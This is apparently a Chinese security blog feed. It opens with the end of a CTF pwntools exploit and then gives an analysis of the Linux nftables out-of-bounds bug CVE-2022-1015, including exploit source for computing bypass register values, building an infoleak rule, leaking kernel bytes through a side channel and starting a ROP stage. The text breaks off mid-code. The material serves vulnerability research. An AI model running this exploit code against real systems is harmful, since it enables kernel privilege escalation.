class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl+=fake_wfile.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl+=fake_wfile_vtable.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl+=fake_chunk<br><br>write_pl(pl)<br><br>reseed()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-1015 nftablesæ ˆæº¢å‡º</title>
    <link href="/2024/08/23/cve-2022-1015/"/>
    <url>/2024/08/23/cve-2022-1015/</url>
    
    <content type="html"><![CDATA[<p>å’•å’•å’•ï¼Œé‡å¯kernel</p><span id="more"></span><ul><li><strong>å½±å“ç‰ˆæœ¬</strong>ï¼š5.12~5.17</li><li>åˆ©ç”¨æ¡ä»¶ï¼šCAP_NET_ADMIN</li></ul><p>å‚è€ƒï¼š<a href="https://bsauce.github.io/2022/07/16/CVE-2022-1015/#kernel-exploitcve-2022-1015-nftables-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8">ã€kernel exploitã€‘CVE-2022-1015 nftables æ ˆæº¢å‡ºæ¼æ´åˆ†æä¸åˆ©ç”¨</a></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="nft-regs"><a href="#nft-regs" class="headerlink" title="nft_regs"></a>nft_regs</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span> &#123;</span><br>u32code;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span>*<span class="hljs-title">chain</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[NFT_REG32_NUM];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å‚è€ƒä¸‹å›¾ï¼Œ1ä¸ªverdictï¼Œ4ä¸ªNFT_REGï¼š</p><img src="/2024/08/23/cve-2022-1015/regs.png" class title="regs"><ul><li>nftablesæœ€å¼€å§‹ä½¿ç”¨ <strong>16bytes verdict</strong> + <strong>4</strong> x <strong>16bytes data reg</strong>ï¼Œåºå·å¯¹åº”æšä¸¾ <strong>0 ~ 4</strong></li><li>åæ¥ä½¿ç”¨ <strong>16bytes verdict</strong> + <strong>16</strong> x <strong>4bytes data reg</strong>ï¼Œåºå·å¯¹åº”æšä¸¾ <strong>8 ~ 23</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_registers</span> &#123;</span><br>NFT_REG_VERDICT,<br>NFT_REG_1,<br>NFT_REG_2,<br>NFT_REG_3,<br>NFT_REG_4,<br>__NFT_REG_MAX,<br><br>NFT_REG32_00= <span class="hljs-number">8</span>,<br>NFT_REG32_01,<br>NFT_REG32_02,<br>NFT_REG32_03,<br>NFT_REG32_04,<br>NFT_REG32_05,<br>NFT_REG32_06,<br>NFT_REG32_07,<br>NFT_REG32_08,<br>NFT_REG32_09,<br>NFT_REG32_10,<br>NFT_REG32_11,<br>NFT_REG32_12,<br>NFT_REG32_13,<br>NFT_REG32_14,<br>NFT_REG32_15,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="nft-parse-register"><a href="#nft-parse-register" class="headerlink" title="nft_parse_register"></a>nft_parse_register</h2><p>ç¿»è¯‘å¯„å­˜å™¨ä¸‹æ ‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> reg;<br><br>reg = ntohl(nla_get_be32(attr));<br><span class="hljs-keyword">switch</span> (reg) &#123;<br><span class="hljs-keyword">case</span> NFT_REG_VERDICT...NFT_REG_4:<span class="hljs-comment">// [1]</span><br><span class="hljs-keyword">return</span> reg * NFT_REG_SIZE / NFT_REG32_SIZE;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;  <span class="hljs-comment">// [2]</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨NFT_REGï¼šä¸€ä¸ªreg <strong>4 x 4bytes</strong></li><li>ä½¿ç”¨NFT_REG32ï¼š<ul><li>verdictä¾ç„¶ä½¿ç”¨NFT_REG_VVERDICTå³ <strong>0</strong>ï¼Œå ç”¨ <strong>16bytes &#x2F; 4</strong> ä¸ªä¸‹æ ‡</li><li>NFT_REG32ä»NFT_REG32_00å¼€å§‹ç¼–å·</li></ul></li></ul><h2 id="nft-parse-register-load"><a href="#nft-parse-register-load" class="headerlink" title="nft_parse_register_load"></a>nft_parse_register_load</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register_load</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr, u8 *sreg, u32 len)</span><br>&#123;<br>u32 reg;<br><span class="hljs-type">int</span> err;<br><br>reg = nft_parse_register(attr);<span class="hljs-comment">// [1]</span><br>err = nft_validate_register_load(reg, len); <span class="hljs-comment">// [2]</span><br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>*sreg = reg;  <span class="hljs-comment">// [3]</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_parse_register_load);<br></code></pre></td></tr></table></figure><ul><li>nft_parse_registerè·å–regï¼ˆä¸‹æ ‡ï¼‰</li><li>nft_validate_register_loadæ£€éªŒä¸‹æ ‡åˆæ³•æ€§</li><li>regæ”¾å…¥*sregè¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_validate_register_load</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> nft_registers reg, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)<span class="hljs-comment">// [1]</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) <span class="hljs-comment">// [2]</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt; sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data))  <span class="hljs-comment">// [3]</span><br><span class="hljs-keyword">return</span> -ERANGE;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>regä¸èƒ½ä¸ºverdict</li><li>lenä¸èƒ½ä¸º0</li><li><strong>4 x reg + len</strong> ä¸èƒ½è¶…è¿‡nft_regs.dataçš„èŒƒå›´ï¼ˆ0x50ï¼‰</li></ul><p>nft_parse_register_storeåŸºæœ¬åŒç†</p><h2 id="æ¼æ´è§¦å‘"><a href="#æ¼æ´è§¦å‘" class="headerlink" title="æ¼æ´è§¦å‘"></a>æ¼æ´è§¦å‘</h2><ul><li><p>ç»è¿‡nft_parse_registeråï¼Œregçš„èŒƒå›´ï¼š</p><ul><li>NFT_REGï¼š**{ 0, 4, 8, 12, 16 }**</li><li>NFT_REG32ï¼š**[ 1, 0xfffffffb ]**</li></ul></li><li><p>nft_validate_register_loadæ£€æŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt; sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data)) <span class="hljs-comment">// 0x50</span><br><span class="hljs-keyword">return</span> -ERANGE;<br></code></pre></td></tr></table></figure><p>regå½¢å¦‚ <strong>{ 0x3f, 0x7f, 0xff } . ffffff . [ 0, 0xfb ]</strong> æ—¶ä¼šå¯¼è‡´æº¢å‡ºï¼Œä¸¾ä¾‹ <strong>reg &#x3D; 0xfffffff0, len &#x3D; 0x40</strong></p><ul><li>x4ï¼š<strong>0xffffffc0</strong></li><li>+lenï¼š<strong>0</strong></li><li>é€šè¿‡æ£€æŸ¥</li></ul></li><li><p>nft_parse_register_loadæœ€ç»ˆè¿”å›ï¼š</p><ul><li><strong>*sreg &#x3D; 0xf0</strong></li><li><strong>len &#x3D; 0x40</strong></li></ul><p>é€ æˆè¶Šç•Œ</p></li></ul><h3 id="nft-bitwise"><a href="#nft-bitwise" class="headerlink" title="nft_bitwise"></a>nft_bitwise</h3><ul><li>ï¼ˆå®é™…ï¼‰0x40å­—èŠ‚</li></ul><p>å¯„å­˜å™¨èŒƒå›´ï¼š</p><ul><li>lowï¼š<strong>0x7ffffff0 x 4 &#x3D; 0xffffffc0</strong>ï¼Œå†™å…¥sregæœ€ä½å­—èŠ‚ <strong>0xf0</strong>ï¼ˆ0xffffffc0 + 0x40 &#x3D; 0 å¯é€šè¿‡validateæ£€æŸ¥ï¼‰</li><li>highï¼š<strong>0x7ffffffb x 4 &#x3D; 0xffffffec</strong>ï¼Œå†™å…¥sregæœ€ä½å­—èŠ‚ <strong>0xfb</strong></li></ul><p>ç”±ä¸‹æ ‡è½¬åŒ–ä¸ºåç§»ï¼š</p><ul><li>lowï¼š<strong>0xf0 x 4 &#x3D; 0x3c0</strong></li><li>highï¼š<strong>0xfb x 4 + 0x40 &#x3D; 0x42c</strong></li></ul><p>å®é™…èŒƒå›´ï¼š**[ 0x3c0, 0x42c ] bytes**</p><h3 id="nft-payload"><a href="#nft-payload" class="headerlink" title="nft_payload"></a>nft_payload</h3><ul><li>0xffå­—èŠ‚</li></ul><p>å¯„å­˜å™¨èŒƒå›´ï¼š</p><ul><li>lowï¼š<strong>0x7fffffc1 x 4 &#x3D; 0xffffff04</strong>ï¼Œå†™å…¥sregæœ€ä½å­—èŠ‚ <strong>0xc1</strong>ï¼ˆ0xffffff04 + 0xff &#x3D; 3 å¯é€šè¿‡validateæ£€æŸ¥ï¼‰</li><li>highï¼š<strong>0x7fffffd4 x 4 &#x3D; 0xffffff50</strong>ï¼Œå†™å…¥sregæœ€ä½å­—èŠ‚ <strong>0xd4</strong>ï¼ˆ0xffffff50 + 0xff &#x3D; 0x4f å¯é€šè¿‡validateæ£€æŸ¥ï¼‰</li></ul><p>ç”±ä¸‹æ ‡è½¬åŒ–ä¸ºåç§»ï¼š</p><ul><li>lowï¼š<strong>0xc1 x 4 &#x3D; 0x304</strong></li><li>highï¼š<strong>0xd4 x 4 + 0xff &#x3D; 0x44f</strong></li></ul><p>å®é™…èŒƒå›´ï¼š**[ 0x304, 0x44f ] bytes**</p><h1 id="expè°ƒè¯•åˆ†æ"><a href="#expè°ƒè¯•åˆ†æ" class="headerlink" title="expè°ƒè¯•åˆ†æ"></a>expè°ƒè¯•åˆ†æ</h1><p>æ¥è‡ªğŸ‘‰<a href="https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2022-1015/exploit">kernel-exploit-factory</a></p><h2 id="è¶Šç•ŒèŒƒå›´è®¡ç®—"><a href="#è¶Šç•ŒèŒƒå›´è®¡ç®—" class="headerlink" title="è¶Šç•ŒèŒƒå›´è®¡ç®—"></a>è¶Šç•ŒèŒƒå›´è®¡ç®—</h2><ul><li>å‚æ•°ï¼š<ul><li>resultï¼šè®¡ç®—ç»“æœ</li><li>desiredï¼šæœŸæœ›idx</li><li>min_lenï¼šæœŸæœ›æœ€å°é•¿åº¦</li><li>max_lenï¼šæœŸæœ›æœ€å¤§é•¿åº¦</li></ul></li><li>å…¶å®å°±æ˜¯0x3fï¼Œ0x7fï¼Œ0xffä¸‰ç§å‰ç¼€</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calc_vuln_expr_params</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vuln_expr_params *result, <span class="hljs-type">uint8_t</span> desired, <span class="hljs-type">uint32_t</span> min_len, <span class="hljs-type">uint32_t</span> max_len)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i) &#123;<br>        <span class="hljs-type">int</span> res = calc_vuln_expr_params_div(result, desired, min_len, max_len, i);<br>        <span class="hljs-keyword">if</span> (!res)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åˆå§‹åŒ–regå€¼ä¸ºæœ€å¤§å€¼</li><li>è®¡ç®—validate<ul><li>åˆ¤æ–­æ˜¯å¦æº¢å‡ºï¼Œå¦åˆ™breakï¼Œè¿”å›é”™è¯¯å€¼ï¼ˆå†å¾€ä¸‹å‡å°±ä¸ä¼šæº¢å‡ºäº†ï¼‰</li></ul></li><li>åˆ¤æ–­ä½å­—èŠ‚æ˜¯å¦æ˜¯æˆ‘ä»¬æƒ³è¦çš„idx<ul><li>å¦åˆ™é€’å‡regå€¼ï¼Œgoto [2]</li></ul></li><li>è®¡ç®—è¦é€ æˆæº¢å‡ºæœ€å°çš„len</li><li>è®¡ç®—æœ€å¤§çš„len</li><li>æ›´æ–°lenèŒƒå›´</li><li>æ›´æ–°valueï¼ˆ+4ï¼‰ï¼Œè¿™æ˜¯è¦å¡«å…¥çš„regå€¼</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calc_vuln_expr_params_div</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vuln_expr_params* result, <span class="hljs-type">uint8_t</span> desired, <span class="hljs-type">uint32_t</span> min_len, <span class="hljs-type">uint32_t</span> max_len, <span class="hljs-type">int</span> shift)</span><br>&#123;<br>    <span class="hljs-comment">// [1]</span><br>    <span class="hljs-type">uint64_t</span> base_ = (<span class="hljs-type">uint64_t</span>)(<span class="hljs-number">1</span>) &lt;&lt; (<span class="hljs-number">32</span> - shift);<br>    <span class="hljs-type">uint32_t</span> base = (<span class="hljs-type">uint32_t</span>)(base_ - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (base == <span class="hljs-number">0xffffffff</span>)<br>        base = <span class="hljs-number">0xfffffffb</span>;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// [2]</span><br>        <span class="hljs-type">uint64_t</span> computed = (base * <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xffffffff</span>;<br>        <span class="hljs-type">uint64_t</span> max_value = computed + (<span class="hljs-type">uint64_t</span>)(max_len);<br>        <span class="hljs-keyword">if</span> (max_value &lt; ((<span class="hljs-type">uint64_t</span>)(<span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">32</span>)) <br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">// [3]</span><br>        <span class="hljs-keyword">if</span> ( (base &amp; <span class="hljs-number">0xff</span>) != desired) &#123; <br>            base--;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// [4]</span><br>        <span class="hljs-type">uint32_t</span> len_at_least = ((<span class="hljs-type">uint64_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>) - computed;<br>        <span class="hljs-comment">// [5]</span><br>        <span class="hljs-type">uint32_t</span> len_at_most  = len_at_least + <span class="hljs-number">0x50</span>; <br>        <br>        <span class="hljs-comment">// [6]</span><br>        <span class="hljs-keyword">if</span> (min_len &gt; len_at_least) <br>            len_at_least = min_len;<br><br>        <span class="hljs-keyword">if</span> (max_len &lt; len_at_most) <br>            len_at_most = max_len;<br><br>        result-&gt;max_len = len_at_most;<br>        result-&gt;min_len = len_at_least;<br>        <span class="hljs-comment">// [7]</span><br>        result-&gt;value = base + <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="nftablesè§„åˆ™å»ºç«‹"><a href="#nftablesè§„åˆ™å»ºç«‹" class="headerlink" title="nftablesè§„åˆ™å»ºç«‹"></a>nftablesè§„åˆ™å»ºç«‹</h2><ul><li><p>tableï¼š</p><ul><li>exploit_tableï¼šinet</li></ul></li><li><p>chainï¼š</p><ul><li>base_chainï¼šoutputï¼ŒNFPROTO_IPV4</li><li>aux_chainï¼šoutputï¼ŒNFPROTO_IPV4</li></ul></li><li><p>rulesï¼š</p><ul><li><p>base_chainï¼š</p><table><thead><tr><th>Expression</th><th>Aguments</th><th>Comment</th></tr></thead><tbody><tr><td>payload</td><td>base &#x3D; NFT_PAYLOAD_TRANSPORT_HEADER</td><td>å°†packetç›®æ ‡ç«¯å£å†™åˆ°reg 8</td></tr><tr><td></td><td>offset &#x3D; offsetof(udphdr, dport)</td><td></td></tr><tr><td></td><td>len &#x3D; sizeof_field(udphdr, dport)</td><td></td></tr><tr><td>cmp</td><td>op &#x3D; NFT_CMP_EQ</td><td>æ¯”è¾ƒreg 8æ˜¯å¦ä¸º9999</td></tr><tr><td></td><td>sreg &#x3D; 8</td><td>å¦åˆ™å‘å‡ºNFT_BREAK</td></tr><tr><td></td><td>data &#x3D; 999</td><td></td></tr><tr><td>payload</td><td>base &#x3D; NFT_PAYLOAD_INNER_HEADER</td><td>å°†packetå‰8å­—èŠ‚å†™å…¥reg 8</td></tr><tr><td></td><td>offset &#x3D; 0</td><td></td></tr><tr><td></td><td>len &#x3D; 8</td><td></td></tr><tr><td>cmp</td><td>op &#x3D; NFT_CMP_EQ</td><td>æ¯”è¾ƒreg 8æ˜¯å¦ä¸ºmagic</td></tr><tr><td></td><td>sreg &#x3D; 8</td><td>å¦åˆ™å‘å‡ºNFT_BREAK</td></tr><tr><td></td><td>data &#x3D; 0xdeadbeef0badc0de</td><td></td></tr><tr><td>immediate</td><td>verdict &#x3D; NFT_JUMP</td><td>è°ƒç”¨aux_chain</td></tr><tr><td></td><td>chain &#x3D; aux_chain</td><td></td></tr></tbody></table></li><li><p>aux_chainï¼š</p><table><thead><tr><th>Expression</th><th>Arguments</th><th>Comment</th></tr></thead><tbody><tr><td>bitwise</td><td>op &#x3D; NFT_BITWISE_RSHIFT</td><td>åˆ©ç”¨OOB readå†…æ ¸åœ°å€å­—èŠ‚</td></tr><tr><td></td><td>data &#x3D; SHIFT_AMT</td><td>ç§»ä½SHIFT_AMT bitså†™å…¥reg 1</td></tr><tr><td></td><td>sreg &#x3D; OOB_OFFSET</td><td></td></tr><tr><td></td><td>dreg &#x3D; 1</td><td></td></tr><tr><td>cmp</td><td>op &#x3D; NFT_CMP_GT</td><td>æ¯”è¾ƒå†…æ ¸å­—èŠ‚å’ŒCOMPARED</td></tr><tr><td></td><td>sreg &#x3D; ADDRESS_OFFSET</td><td>å°äºç­‰äºCOMPAREDå‘å‡ºNFT_BREAK</td></tr><tr><td></td><td>data &#x3D; COMPARED</td><td>å¤§äºåˆ™ç»§ç»­</td></tr><tr><td>immediate</td><td>verdict &#x3D; NFT_DROP</td><td>drop packet</td></tr></tbody></table></li></ul></li></ul><h2 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h2><ul><li><p>æ–°å»ºThread Bï¼šleak_handler</p><p>ç›‘å¬SERVER_PORTï¼Œé‡å¤ä»¥ä¸‹è¿‡ç¨‹</p><ul><li>æ¥æ”¶æ¶ˆæ¯</li><li>å›å¤MSG_OK</li></ul></li><li><p>å½“å‰Thread Aï¼š</p><p>ä½¿ç”¨CLIENT_PORTï¼Œdo_leak_byteæ³„æ¼1-3å­—èŠ‚</p><ul><li><p>äºŒåˆ†æ³•ä¾§ä¿¡é“è®¡ç®—mid</p><ul><li><p>å»ºç«‹leak ruleï¼Œå¯¹æ¯”posæ˜¯å¦ä¸ºcmpï¼ˆmidï¼‰</p><ul><li>bitwiseç›®æ ‡æ•°æ®ä»0x3d4ï¼ˆindex 0xf5ï¼‰å¼€å§‹0x40å­—èŠ‚</li><li>bitwiseå³ç§»pos x 8 bitï¼Œæ•°æ®æ”¾è‡³reg 1</li><li>å¯¹æ¯”cmpå’Œreg 0x15ï¼Œ1å­—èŠ‚ï¼Œå°äºç­‰äºbreakï¼Œå¤§äºdropï¼›è®¡ç®—é€»è¾‘å¦‚ä¸‹ï¼š<ul><li>æ³„æ¼ç›®æ ‡åç§»0x408</li><li>å°†0x408 - 0x3d4 &#x3D; 0x34å­—èŠ‚å¤åˆ¶è‡³reg 1</li><li>reg 1ä½¿ç”¨çš„æ˜¯NFT_REGï¼Œå®é™…index &#x3D; 1 x 4 &#x3D; 4</li><li>ç›®æ ‡å­—èŠ‚å®é™…indexï¼š4 + 0x34 &#x2F; 4 &#x3D; 0x11</li><li>å®é™…index 0x11ä½¿ç”¨NFT_REG32ï¼Œä¼ å…¥çš„index &#x3D; 0x11 + 4 &#x3D; 0x15</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_infoleak_rule</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-keyword">struct</span> nftnl_rule* r, <span class="hljs-type">uint8_t</span> cmp, <span class="hljs-type">uint8_t</span> pos, <span class="hljs-type">uint16_t</span> family, <span class="hljs-type">int</span>* seq, <span class="hljs-type">int</span> extraflags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vuln_expr_params</span> <span class="hljs-title">vuln_params</span>;</span><br><br>    <span class="hljs-comment">// [1]</span><br>    <span class="hljs-keyword">if</span> (calc_vuln_expr_params(&amp;vuln_params, <span class="hljs-number">0xf5</span>,  <span class="hljs-number">0x40</span>, <span class="hljs-number">0x40</span>)) <br>        error(<span class="hljs-string">&quot;Could not find correct params to trigger OOB read.&quot;</span>);<br><br>    <span class="hljs-comment">// [2]</span><br>    <span class="hljs-type">uint32_t</span> shift_amt = (pos * <span class="hljs-number">8</span>);<br>    rule_add_bit_shift(r, NFT_BITWISE_RSHIFT, vuln_params.min_len, vuln_params.value, <span class="hljs-number">1</span>, &amp;shift_amt, <span class="hljs-keyword">sizeof</span> shift_amt);<br><br>    <span class="hljs-comment">// [3]</span><br>    rule_add_cmp(r, NFT_CMP_GT, <span class="hljs-number">0x15</span>, &amp;cmp, <span class="hljs-number">1</span>);<br>    rule_add_immediate_verdict(r, NF_DROP, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// [4]</span><br>    <span class="hljs-keyword">return</span> send_batch_request(<br>        nl,<br>        NFT_MSG_NEWRULE | (NFT_TYPE_RULE &lt;&lt; <span class="hljs-number">8</span>),<br>        NLM_F_CREATE | extraflags, family, (<span class="hljs-type">void</span>**)&amp;r, seq,<br>        <span class="hljs-literal">NULL</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>clientå‘serverå‘é€magic &#x3D; 0xdeadbeef0badc0deï¼Œè§¦å‘leak rule</p></li><li><p>recv from server</p><ul><li>å¦‚æœrecvå¤±è´¥ï¼Œè¯´æ˜å‘ç”ŸDROPï¼Œtarget &gt; mid</li><li>å¦‚æœæ”¶åˆ°MSG_OKï¼Œè¯´æ˜target &lt;&#x3D; mid</li><li>å¦‚æœæ”¶åˆ°çš„æ¶ˆæ¯ä¸æ˜¯MSG_OKï¼Œå‘ç”Ÿé”™è¯¯</li></ul></li></ul></li></ul></li></ul><img src="/2024/08/23/cve-2022-1015/side_channel.png" class title="side_channel"><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>nft_payload OOB write</p><h3 id="hook-input"><a href="#hook-input" class="headerlink" title="hook input"></a>hook input</h3><h4 id="ROPå‰"><a href="#ROPå‰" class="headerlink" title="ROPå‰"></a>ROPå‰</h4><ul><li><p>åˆ›å»ºä¸€æ¡æ–°çš„base_chainï¼ŒROPåŠ«æŒçš„æ˜¯inputçš„hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">unft_base_chain_param</span> <span class="hljs-title">bp</span>;</span><br>bp.hook_num = NF_INET_LOCAL_IN;<br>bp.prio = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (create_chain(nl, table_name, <span class="hljs-string">&quot;base_chain_2&quot;</span>, NFPROTO_IPV4, &amp;bp, &amp;seq, <span class="hljs-literal">NULL</span>)) <br>    error(<span class="hljs-string">&quot;Failed adding second base 